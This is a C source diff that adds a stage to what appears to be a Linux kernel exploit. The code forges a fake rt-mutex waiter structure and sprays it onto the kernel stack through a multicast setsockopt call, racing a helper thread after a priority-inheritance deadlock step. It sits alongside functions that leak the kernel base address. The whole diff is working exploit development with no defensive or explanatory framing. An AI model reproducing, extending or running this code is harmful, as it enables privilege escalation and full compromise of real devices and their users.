@@ -31,6 +31,7 @@ static atomic_int slide_deadlock_seen;
 static atomic_int slide_waiter_ok;
 static atomic_int slide_route_done;
 static atomic_int slide_waiter_tid;
+static atomic_int slide_stack_write_window;
 static atomic_int slide_consume_calls;
 static atomic_int slide_consume_go;
 static atomic_int slide_consume_seen;
@@ -357,6 +358,7 @@ void slide_pselect_stack_copy(void) {
   atomic_store(&slide_consume_sched_ok, 0);
   atomic_store(&slide_consume_last_sched_ret, -1);
   atomic_store(&slide_consume_last_sched_errno, 0);
+  atomic_store(&slide_stack_write_window, 0);
   atomic_store(&slide_pselect_write_window, 0);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   atomic_store(&slide_pselect_started_ns, 0);
@@ -922,6 +924,14 @@ static int slide_child_trigger_write(void) {
   }
   pr_info("slide pi stage=deadlock-accepted\n");
   atomic_store(&slide_deadlock_seen, 1);
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_MCAST) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
+  pr_info("slide pi stage=writer-enter tid=%d\n", tid);
+  slide_mcast_stack_copy();
+  pr_info("slide pi stage=writer-return tid=%d window=%d\n",
+          tid, atomic_load(&slide_stack_write_window));
+#endif
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
@@ -1674,3 +1684,63 @@ int slide_leak_kernel_base(void) {
   return 0;
 #endif
 }
+
+#if defined(SLIDE_STACK_WRITER) && \
+    defined(SLIDE_STACK_WRITER_MCAST) && \
+    SLIDE_STACK_WRITER == SLIDE_STACK_WRITER_MCAST
+static void slide_build_fake_waiter(unsigned char *payload,
+                                    size_t waiter_off) {
+  memset(payload + waiter_off, 0, FAKE_WAITER_LAYOUT_SIZE);
+  put_fake_waiter(payload, waiter_off,
+                  slide_oracle_parent, 0, slide_oracle_target,
+                  slide_oracle_parent, 0, slide_oracle_target,
+                  fake_task, fake_lock, FAKE_WAITER_PRIO);
+}
+
+static void slide_mcast_stack_copy(void) {
+  enum { stamp_size = 0x108 };
+  _Static_assert(MCAST_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <= stamp_size,
+                 "MCAST waiter must fit in the copied stack stamp");
+  unsigned char stamp[stamp_size];
+  memset(stamp, 0, sizeof(stamp));
+  uint16_t invalid_family = AF_UNSPEC;
+  memcpy(stamp + 0x08, &invalid_family, sizeof(invalid_family));
+  slide_build_fake_waiter(stamp, MCAST_WAITER_OFF);
+
+  int fd = socket(SLIDE_MCAST_DOMAIN, SOCK_DGRAM | SOCK_CLOEXEC, 0);
+  if (fd < 0) {
+    pr_error("slide mcast socket errno=%d\n", errno);
+    return;
+  }
+
+  atomic_store(&slide_consume_stop, 0);
+  atomic_store(&slide_consume_go, 0);
+  atomic_store(&slide_consume_calls, 0);
+  atomic_store(&slide_consume_sched_ok, 0);
+  atomic_store(&slide_consume_last_sched_ret, -1);
+  atomic_store(&slide_consume_last_sched_errno, 0);
+  atomic_store(&slide_stack_write_window, 0);
+
+  errno = 0;
+  int ret = setsockopt(fd, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
+                       stamp, sizeof(stamp));
+  int saved_errno = errno;
+  atomic_store(&slide_consume_go, 1);
+  while (!atomic_load(&slide_consume_stop))
+    __asm__ volatile("yield" ::: "memory");
+  atomic_store(&slide_consume_go, 0);
+
+  int sched_ok = atomic_load(&slide_consume_sched_ok);
+  atomic_store(&slide_stack_write_window,
+               ret == -1 && saved_errno == EADDRNOTAVAIL && sched_ok > 0);
+  pr_info("slide mcast returned domain=%d level=%d option=%d "
+          "offset=%#x ret=%d errno=%d "
+          "calls=%d sched_ok=%d last_sched_ret=%d last_sched_errno=%d\n",
+          SLIDE_MCAST_DOMAIN, SLIDE_MCAST_LEVEL, SLIDE_MCAST_OPTION,
+          MCAST_WAITER_OFF, ret, saved_errno,
+          atomic_load(&slide_consume_calls), sched_ok,
+          atomic_load(&slide_consume_last_sched_ret),
+          atomic_load(&slide_consume_last_sched_errno));
+  close(fd);
+}
+#endif
